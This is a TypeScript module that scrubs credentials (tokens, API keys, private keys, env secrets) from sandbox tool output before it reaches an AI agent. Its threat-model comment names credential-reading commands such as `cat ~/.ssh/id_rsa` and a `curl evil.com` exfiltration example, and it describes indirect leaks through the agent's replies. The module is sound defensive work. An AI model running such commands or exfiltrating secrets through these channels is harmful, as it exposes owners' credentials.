/**
 * Secret redaction for sandbox tool outputs.
 *
 * Threat model: anything that runs inside the sandbox can be asked to read any
 * file or env var (e.g. `cat ~/.ssh/id_rsa`, `printenv GH_TOKEN`,
 * `cat ~/.git-credentials`). Sandbox-side network egress is locked down so
 * direct exfil via `curl evil.com` is blocked, but the call-side
 * (sandbox-run -> stdout -> agent context -> respond-to-user / logs) is a
 * valid channel for indirect exfil. This module scrubs known secret patterns
 * from the stdout / stderr / file-content strings before they reach the agent.
 *
 * Defense-in-depth only:
 *   - Catches accidental leaks (agent echoes a token, error stack includes env,
 *     model copies a fragment into its reply, log lines contain raw values).
 *   - Does NOT stop a determined attacker who base64-encodes, splits across
 *     calls, or otherwise obfuscates. The real defense against that is
 *     short-lived credentials (GitHub App installation tokens, per-session BB
 *     deploy keys) so the exfilled value is worthless by the time it's reused.
 *
 * Patterns intentionally favour false positives over false negatives — a
 * legitimately-mentioned token shape gets [REDACTED_*] in the agent's view,
 * which is acceptable. We never want a real secret to slip through.
 *
 * ReDoS note: all multi-line / variable-length patterns below use a lazy
 * `[\s\S]+?` bounded by a literal terminator, or bounded character classes
 * with single quantifiers — no nested/overlapping quantifiers that could
 * backtrack catastrophically. Keep new patterns linear.
 */

const PATTERNS: Array<{ re: RegExp; tag: string }> = [
  // ── URL-embedded credentials (highest priority for THIS env) ──────────────
  // The agent routinely reads `.git/config`, runs `git remote -v`, and reads
  // ~/.git-credentials, all of which can contain `scheme://user:pass@host`.
  // This is the single most likely real exfil shape (Bitbucket app password /
  // GitHub x-access-token / oauth2 tokens live in the userinfo segment).
  // Redact ONLY the userinfo, preserving the host so output stays readable.
  // Captures: scheme `://`, then user[:password], then `@host`.
  // user/password classes exclude `/ : @ whitespace` to stay on one authority.
  {
    re: /([a-zA-Z][a-zA-Z0-9+.-]{0,31}:\/\/)[^/:@\s]{1,256}(?::[^/@\s]{1,256})?@/g,
    tag: "$1[REDACTED_URL_CREDENTIALS]@",
  },

  // ── GitHub ────────────────────────────────────────────────────────────────
  // GitHub classic PAT (40 chars after prefix). Kept loose on length to also
  // match the ghp_… preview shown by GitHub during creation.
  { re: /\bghp_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_PAT_CLASSIC]" },
  // GitHub fine-grained PAT (~76 chars after prefix).
  { re: /\bgithub_pat_[A-Za-z0-9_]{60,}\b/g, tag: "[REDACTED_GITHUB_PAT_FINEGRAINED]" },
  // GitHub App installation token. Short-lived but still worth scrubbing.
  { re: /\bghs_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_INSTALLATION_TOKEN]" },
  // GitHub OAuth user-to-server tokens (gho_) and refresh tokens (ghr_).
  { re: /\bgho_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_OAUTH]" },
  { re: /\bghr_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_REFRESH]" },
  // GitHub user-to-server token (ghu_), produced by GitHub App user auth flows.
  { re: /\bghu_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_USER_TO_SERVER]" },

  // ── Bitbucket / Atlassian ──────────────────────────────────────────────────
  // Bitbucket Server / Data Center HTTP access tokens. Two known prefixes.
  { re: /\bBBDC-[A-Za-z0-9+/=]{20,}\b/g, tag: "[REDACTED_BITBUCKET_TOKEN]" },
  // Bitbucket Cloud App Passwords / API tokens (ATATT/ATBB).
  { re: /\bATAT[A-Z][A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_ATLASSIAN_API_TOKEN]" },
  { re: /\bATBB[A-Za-z0-9+/=]{20,}\b/g, tag: "[REDACTED_BITBUCKET_APP_PASSWORD]" },
  // Atlassian Cloud API tokens are also distributed in a long opaque form that
  // doesn't always carry the ATATT prefix; the `://user:pass@` URL rule and the
  // generic-assignment rule below catch app passwords used in clone URLs / env.

  // ── Slack ───────────────────────────────────────────────────────────────────
  // Slack tokens (xoxb-, xoxp-, xoxa-, xoxs-).
  { re: /\bxox[abprs]-[A-Za-z0-9-]{10,}\b/g, tag: "[REDACTED_SLACK_TOKEN]" },

  // ── LLM provider keys ───────────────────────────────────────────────────────
  // Anthropic keys (sk-ant-...) — match before the generic sk- rule for a
  // clearer tag, though the generic rule would also catch them.
  { re: /\bsk-ant-[A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_ANTHROPIC_API_KEY]" },
  // OpenAI project keys (sk-proj-...).
  { re: /\bsk-proj-[A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_OPENAI_PROJECT_KEY]" },
  // OpenAI / Anthropic / Grafana-style sk-… tokens. Conservative bound
  // because plain "sk-" prefix is too common; require at least 32 chars after.
  { re: /\bsk-[A-Za-z0-9_-]{32,}\b/g, tag: "[REDACTED_LLM_API_KEY]" },

  // ── Stripe ──────────────────────────────────────────────────────────────────
  // Stripe live secret / restricted keys (sk_live_, rk_live_). Also test keys.
  { re: /\b[sr]k_(?:live|test)_[A-Za-z0-9]{20,}\b/g, tag: "[REDACTED_STRIPE_KEY]" },

  // ── Google / GCP ────────────────────────────────────────────────────────────
  // Google service account / OAuth access tokens.
  { re: /\bya29\.[A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_GOOGLE_OAUTH]" },
  // Google API key (AIza...). Used for GCP/Firebase/Maps service keys.
  { re: /\bAIza[A-Za-z0-9_-]{35}\b/g, tag: "[REDACTED_GOOGLE_API_KEY]" },
  // GCP service-account JSON: the `"private_key_id": "..."` field. The
  // accompanying `"private_key"` PEM blob is caught by the PEM rule below.
  {
    re: /"private_key_id"\s*:\s*"[A-Za-z0-9]+"/g,
    tag: '"private_key_id": "[REDACTED_GCP_PRIVATE_KEY_ID]"',
  },

  // ── AWS ─────────────────────────────────────────────────────────────────────
  // AWS access key id (and the ASIA temporary form).
  { re: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/g, tag: "[REDACTED_AWS_ACCESS_KEY_ID]" },
  // AWS secret access key / session token when assigned in env or config files,
  // e.g. `aws_secret_access_key=...`, `AWS_SESSION_TOKEN=...`. The bare 40-char
  // secret has no fixed shape (base64-ish), so we only redact it when it's
  // clearly tied to an AWS secret/session assignment to avoid mass false
  // positives. Case-insensitive key, value bounded to non-space run.
  {
    re: /\b(aws_secret_access_key|aws_session_token)(["']?\s*[:=]\s*["']?)[A-Za-z0-9/+=_-]{16,2048}/gi,
    tag: "$1$2[REDACTED_AWS_SECRET]",
  },

  // ── JWT / auth headers ──────────────────────────────────────────────────────
  // JSON Web Tokens: header.payload.signature, each base64url. Common as
  // Authorization bearer values, id_tokens, and in env dumps.
  {
    re: /\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b/g,
    tag: "[REDACTED_JWT]",
  },
  // Authorization header values: `Authorization: Bearer <token>` / `Basic <b64>`.
  // Redact the credential, keep the scheme word for readability.
  {
    re: /\b(Bearer|Basic)\s+[A-Za-z0-9._~+/=-]{12,4096}/g,
    tag: "$1 [REDACTED_AUTH_HEADER]",
  },

  // ── Package / registry / container auth ─────────────────────────────────────
  // npm registry auth tokens in .npmrc: `//registry.npmjs.org/:_authToken=...`.
  {
    re: /(_authToken\s*=\s*)[A-Za-z0-9._-]{8,1024}/g,
    tag: "$1[REDACTED_NPM_TOKEN]",
  },
  // Docker config.json `"auth": "<base64 user:pass>"`.
  {
    re: /"auth"\s*:\s*"[A-Za-z0-9+/=]{12,}"/g,
    tag: '"auth": "[REDACTED_DOCKER_AUTH]"',
  },
  // .netrc credentials: `machine host login user password secret`. Redact the
  // password token following the `password` keyword.
  {
    re: /\b(password\s+)\S{1,1024}/gi,
    tag: "$1[REDACTED_NETRC_PASSWORD]",
  },

  // ── DB / connection strings with embedded passwords ─────────────────────────
  // postgres://, mysql://, mongodb(+srv)://, redis://, amqp:// with creds are
  // already covered by the generic `://user:pass@` rule at the top. No extra
  // rule needed — documented here so future readers don't add a duplicate.

  // ── Generic high-entropy env / dotenv assignments ───────────────────────────
  // Catches `printenv` / `cat .env` dumps: any KEY whose name ends in a
  // sensitive word (TOKEN/SECRET/PASSWORD/PASSWD/API_KEY/APIKEY/PRIVATE_KEY/
  // ACCESS_KEY/CLIENT_SECRET/CREDENTIAL) assigned a non-trivial value. Handles
  // optional `export `, `=` or `:` separators, and optional quotes. Value is a
  // single bounded non-space (or quoted) run — linear, no backtracking blowup.
  {
    re: /\b((?:export\s+)?[A-Za-z0-9_]{0,64}(?:TOKEN|SECRET|PASSWORD|PASSWD|API[_-]?KEY|PRIVATE[_-]?KEY|ACCESS[_-]?KEY|CLIENT[_-]?SECRET|CREDENTIALS?)\s*[:=]\s*)(["']?)[^\s"']{6,2048}\2/gi,
    tag: "$1$2[REDACTED_ENV_SECRET]$2",
  },

  // ── PEM private keys (last; multi-line) ─────────────────────────────────────
  // Generic PEM-encoded private keys (ssh-rsa, ed25519, ecdsa, openssh, GCP
  // service-account "private_key", etc.). Multi-line; lazy [\s\S]+? bounded by
  // the END marker — linear, no ReDoS.
  {
    re: /-----BEGIN [A-Z0-9 ]{0,40}PRIVATE KEY-----[\s\S]{1,16384}?-----END [A-Z0-9 ]{0,40}PRIVATE KEY-----/g,
    tag: "[REDACTED_PRIVATE_KEY]",
  },
  // PuTTY private key files (.ppk) — different header shape, not "PRIVATE KEY".
  // Redact from the header through the end of the (single-line) MAC field.
  {
    re: /PuTTY-User-Key-File-\d[\s\S]{1,16384}?Private-MAC:\s*\S{1,128}/g,
    tag: "[REDACTED_PUTTY_PRIVATE_KEY]",
  },
  // Encrypted PEM key headers (Proc-Type/DEK-Info) that may appear even if the
  // BEGIN/END block above somehow doesn't match (truncated dumps). Redact the
  // DEK-Info line which carries the IV.
  { re: /^DEK-Info:.*$/gim, tag: "[REDACTED_DEK_INFO]" },
];

/**
 * Run all known secret patterns over `text` and replace each match with a
 * tagged placeholder. Returns the same input untouched if no matches.
 */
export function redactSecrets(text: string): string {
  if (!text) return text;
  let out = text;
  for (const { re, tag } of PATTERNS) {
    out = out.replace(re, tag);
  }
  return out;
}

/**
 * Convenience: redact stdout/stderr fields in a result object then JSON.stringify.
 * Use at every sandbox tool return site that pipes raw command output back.
 */
export function redactAndStringify(obj: Record<string, unknown>): string {
  const redacted: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    redacted[k] = typeof v === "string" ? redactSecrets(v) : v;
  }
  return JSON.stringify(redacted);
}
